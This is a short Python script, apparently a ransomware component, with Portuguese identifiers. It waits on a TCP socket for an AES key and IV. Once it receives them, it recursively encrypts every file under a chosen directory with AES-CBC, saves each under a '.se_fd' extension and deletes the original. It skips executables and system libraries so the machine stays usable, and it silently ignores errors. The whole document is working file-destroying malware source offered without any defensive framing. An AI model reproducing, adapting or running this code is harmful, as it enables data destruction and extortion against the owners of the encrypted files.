import os
import sys
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import socket

chave_aes = b''
chave_iv = b''
caminho = sys.argv[1]
porta = 4554

def escuta(ip='localhost'):
    global chave_aes, chave_iv, caminho, porta
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:

        sock.bind((ip, porta))
        sock.listen()

        conn, addr = sock.accept()
        with conn:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                data2 = data.decode('utf-8') 
                parte = data2.split(',') 

                if len(parte) >= 2:

                    var1 = parte[0].strip()
                    var2 = parte[1].strip()
                    

                    chave_aes = bytes.fromhex(var1)
                    chave_iv = bytes.fromhex(var2)
                    busca_arqv(caminho)
                break  

def encrypt_arqv(arqv_path):
    global chave_aes, chave_iv
    try:
     
        with open(arqv_path, 'rb') as f:
            texto = f.read()


        cipher = Cipher(algorithms.AES(chave_aes), modes.CBC(chave_iv), backend=default_backend())
        encryptor = cipher.encryptor()


        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_plaintext = padder.update(texto) + padder.finalize()

        encrypttexto = encryptor.update(padded_plaintext) + encryptor.finalize()


        encrypted_arqv = arqv_path + '.se_fd'
        with open(encrypted_arqv, 'wb') as f:
            f.write(encrypttexto)
        
        os.remove(arqv_path)

    except Exception:
        pass

def busca_arqv(caminho):
    white_list = ['exe', 'dll', 'so', 'vmlinuz','se_fd']

    for diretorio, _, arqvs in os.walk(caminho):
        for _arqv in arqvs:
            arqv_path = os.path.abspath(os.path.join(diretorio, _arqv))
            ext = arqv_path.split('.')[-1]
            if ext not in white_list:
                encrypt_arqv(arqv_path)  

def main():
    escuta()


if __name__ == '__main__':
    main()
